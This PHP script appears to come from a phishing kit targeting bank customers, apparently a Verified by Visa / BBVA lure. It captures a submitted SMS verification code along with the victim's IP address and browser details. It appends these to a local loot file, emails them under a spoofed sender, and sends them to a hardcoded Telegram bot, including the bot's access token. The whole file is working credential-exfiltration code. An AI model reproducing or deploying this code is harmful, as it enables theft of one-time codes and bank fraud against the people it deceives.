<?php

session_start();
include("./system.php"); 
include("./blocker.php");
include("./detect.php");


$InfoDATE   = date("d-m-Y h:i:sa");
$OS =getOS($_SERVER['HTTP_USER_AGENT']); 
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 
include("./your_email.php"); 


$msg="========================================\r\n";
$msg.="===================================\r\n";
$msg.="[+] Sms 1 :	{$_POST['sms']}\r\n";
$msg.="===================================\r\n";
$msg.="[+] localIP : {$_SERVER['REMOTE_ADDR']}\r\n";
$msg.="[+] BROWSER : {$_SESSION['browser']} On/ {$_SESSION['os']}\r\n";
$msg.="\r\n\r\n\r\n";
$save=fopen("../iN00B.txt","a+");fwrite($save,$msg);fclose($save);
$subject="vBV1(ES)(bBva) =?utf-8?Q?=F0=9F=94=A5?= ({$_SERVER['REMOTE_ADDR']})";
$headers="From: FRENÇA™<localhost@moneysSquad.org>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
@mail($email,$subject,$msg,$headers);
$website="https://api.telegram.org/bot7827661077:AAG_AICSnmS-QA80gIx9MAqFj8psjP1W_8o";
$chatId=-4936466509;   
$params=[
    'chat_id'=>'-4936466509',
   'text'=>$msg,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);


?>


